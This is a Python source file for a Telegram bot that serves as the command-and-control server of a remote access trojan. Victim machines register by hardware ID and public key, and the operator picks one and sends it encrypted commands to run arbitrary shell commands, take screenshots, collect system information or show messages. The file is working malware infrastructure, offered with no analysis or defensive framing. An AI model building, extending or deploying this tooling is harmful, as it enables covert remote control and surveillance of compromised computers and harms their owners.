import asyncio
import logging
import base64
from telegram import Update
from telegram.ext import CommandHandler, CallbackContext, Application, MessageHandler, filters
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend


telegram_token = ''
telegram_channel_id = ''
telegram_chat_id = ''

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

logger = logging.getLogger(__name__)

hwid_dict = {}
current_id = 1
selected_client = None
public_keys = {}

logo ="""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣴⣿⣿⣿⣿⣯⣤⣶⣶⣾⣿⣶⣶⣿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠁⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⠶⠶⠦⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣟⣡⣤⣾⣿⣿⣿⣿⣿⣿⢏⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠈⠻⡄⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠈⠙⠻⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⡿⠛⠉⠉⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠁⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠈⠙⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠈⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⢋⣩⡿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣄⣀⡀⠀⠀⠀⠀⠀⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⡄⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠠⣄⣀⣀⡉⢻⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀
⠀⢻⡟⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠉⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⠀⠃⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠈⠉⠻⢿⣿⣿⣿⣷⡄⠀
⠀⠀⠀⠀⢸⣿⣿⡟⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⣿⣿⣿⣿⣿⣧⣀⣀⡄⠀⠀⠀⠀⠀⠀⠈⣿⡿⣿⣿⣷⠀
⠀⠀⠀⠀⢸⣿⡿⠁⠀⠀⠀⠙⠻⠿⣟⠻⢿⣿⣿⣿⣷⣦⡀⠀⠈⠻⢿⣿⣿⣭⣉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠸⣿⣿⡄
⠀⠀⠀⠀⣸⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣦⡀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁
⠀⠀⠀⠠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
    """

def get_unique_id():
    global current_id
    unique_id = current_id
    current_id += 1
    return unique_id

def load_public_key(public_key_pem):
    public_key_pem = f"-----BEGIN PUBLIC KEY-----\n{public_key_pem}\n-----END PUBLIC KEY-----"
    return serialization.load_pem_public_key(
        public_key_pem.encode('utf-8'),
        backend=default_backend()
    )

def encrypt_message(message, public_key):
    encrypted_message = public_key.encrypt(
        message.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(encrypted_message).decode('utf-8')

# Command handlers
async def start(update: Update, context: CallbackContext):
    global logo
    await update.message.reply_text(f'★ Agent Online ★```{logo}```',parse_mode='Markdown')


async def list_clients(update: Update, context: CallbackContext):
    if not hwid_dict:
        await update.message.reply_text('No clients connected.')
    else:
        clients_list = '\n'.join(
            [f'ID: {id}, HWID: {"« " + hwid + " »" if selected_client and selected_client["hwid"] == hwid else hwid}'
             for hwid, id in hwid_dict.items()]
        )
        await update.message.reply_text(f'Connected clients:\n{clients_list}')

async def select_client(update: Update, context: CallbackContext):
    global selected_client, hwid_dict

    args = context.args
    if not args:
        await update.message.reply_text('Please provide a client ID to select.\n(0 to clear selection)')
        return
    
    try:
        client_id = int(args[0])
        if int(client_id) == 0:
            selected_client = None
            await update.message.reply_text('Cleared selection')
            return
        for hwid, uid in hwid_dict.items():
            if uid == client_id:
                selected_client = {"hwid": hwid, "id": uid}
                await update.message.reply_text(f'Selected client ID: {client_id}')
                return

        await update.message.reply_text('Invalid client ID.')
    except ValueError:
        await update.message.reply_text('Invalid client ID format.')

async def process_message(update: Update, context: CallbackContext) -> None:
    global hwid_dict, public_keys
    if update.channel_post:
        message_text = update.channel_post.text
        if message_text.startswith('★'):
            message_text = message_text[1:]  
            hwid, public_key_pem = message_text.split(':')
            hwid = hwid.strip()
            public_key_pem = public_key_pem.strip()
            if hwid not in hwid_dict:
                unique_id = get_unique_id()
                hwid_dict[hwid] = unique_id
                public_keys[hwid] = load_public_key(public_key_pem)
                await context.bot.send_message(chat_id=update.channel_post.chat_id, text=f'New client connected: {hwid}, assigned ID: {unique_id}')
            else:
                await context.bot.send_message(chat_id=update.channel_post.chat_id, text=f'Client {hwid} is already connected with ID: {hwid_dict[hwid]}')
                public_keys[hwid] = load_public_key(public_key_pem)


async def help_command(update: Update, context: CallbackContext):
    global selected_client
    if selected_client is None:
        help_text = (
            'Available commands:\n'
            '/start - Initialize the bot\n'
            '/help - Display a list of available commands\n'
            '/list - List connected clients\n'
            '/select <id> - Select a connected client by ID\n'
            '/show - General Information\n'
            '\n'
            f'Chat ID:\t{update.message.chat.id}'
        )
    else:
        help_text = (
            'Available commands:\n'
            '/cmd - Run command on client\n'
            '/scrot - Take a screenshot\n'
            '/sysinfo - Display system information\n'
            '\n'
            f'SELECTED CLIENT: {selected_client["hwid"]}'
        )

    await update.message.reply_text(help_text)

async def show_info(update: Update, context: CallbackContext):
    total_clients = len(hwid_dict)
    if selected_client:
        await update.message.reply_text(f'Current client ID: {selected_client["hwid"]}, Total clients: {total_clients}\n')
    else:
        await update.message.reply_text(f'No client selected\nTotal clients: {total_clients}\nChat ID:{update.effective_chat.id}')

async def info(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    await update.message.reply_text(f'This chat ID is: {chat_id}')

async def send_command(update: Update, context: CallbackContext):
    global selected_client, public_keys
    if selected_client is None:
        await update.message.reply_text('No client selected. Use /select <id> to select a client.')
        return

    hwid = selected_client['hwid']
    if hwid not in public_keys:
        await update.message.reply_text(f'Public key for client {hwid} not found.')
        return

    message_text = update.message.text
    command_hex = None
    args = None

    if message_text.startswith('/cmd'):
        command_hex = '01'
        args = message_text.split(' ', 1)[1].strip()
    elif message_text.startswith('/scrot'):
        command_hex = '02'
        args = ''
    elif message_text.startswith('/msg'):
        command_hex = '03'
        args  = message_text.split(' ', 1)[1].strip()
    elif message_text.startswith('/sysinfo'):
        command_hex = '00'
        args = ''

    if command_hex is not None:
        command = f'{command_hex}{args}'
        encrypted_command = encrypt_message(command, public_keys[hwid])
        command_message = f'{hwid}:{encrypted_command}'
        await context.bot.send_message(chat_id=telegram_channel_id, text=command_message)
        await update.message.reply_text(f'Sent command to {hwid}')

app = Application.builder().token(telegram_token).build()

app.add_handler(MessageHandler(filters.UpdateType.CHANNEL_POST, process_message))

# Register command handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("info", info))
app.add_handler(CommandHandler("list", list_clients))
app.add_handler(CommandHandler("select", select_client))
app.add_handler(CommandHandler("show", show_info))
app.add_handler(CommandHandler("cmd", send_command))
app.add_handler(CommandHandler("scrot", send_command))
app.add_handler(CommandHandler("msg", send_command))
app.add_handler(CommandHandler("sysinfo", send_command))

# Start the bot with long polling
async def main():
    print(logo)
    async with app:
        await app.start()
        await app.updater.start_polling()

        while True:
            await asyncio.sleep(3600)  

if __name__ == '__main__':
    asyncio.run(main())